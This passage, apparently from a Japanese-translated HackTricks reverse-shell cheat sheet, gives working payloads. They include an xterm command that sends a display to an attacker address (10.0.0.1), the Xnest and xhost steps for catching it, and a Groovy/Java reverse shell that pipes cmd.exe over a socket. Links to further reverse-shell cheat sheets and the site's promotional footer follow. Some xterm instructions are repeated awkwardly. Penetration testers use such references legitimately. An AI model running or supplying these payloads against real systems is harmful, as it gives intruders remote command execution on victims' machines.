xterm -display 10.0.0.1:1
```
以下のコマンドを使用して、着信するxtermをキャッチします。X-Serverを起動します（:1 - TCPポート6001でリッスンします）。これを行う方法の1つは、Xnestを使用することです（システム上で実行する必要があります）：

```bash
Xnest :1
```

次に、xtermを起動し、X-Serverに接続します：

```bash
xterm -display :1
```

これにより、着信するxtermがキャッチされ、X-Server上で表示されます。
```bash
Xnest :1
```
以下のコマンドを実行して、ターゲットがあなたに接続することを許可する必要があります（このコマンドはあなたのホスト上でも実行されます）:
```bash
xhost +targetip
```
## Groovy

by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 注意：Javaの逆シェルもGroovyで動作します。
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## 参考文献

{% embed url="https://highon.coffee/blog/reverse-shell-cheat-sheet/" %}

{% embed url="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell" %}

{% embed url="https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* あなたは**サイバーセキュリティ企業**で働いていますか？ HackTricksであなたの**会社を宣伝**したいですか？または、**PEASSの最新バージョンをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
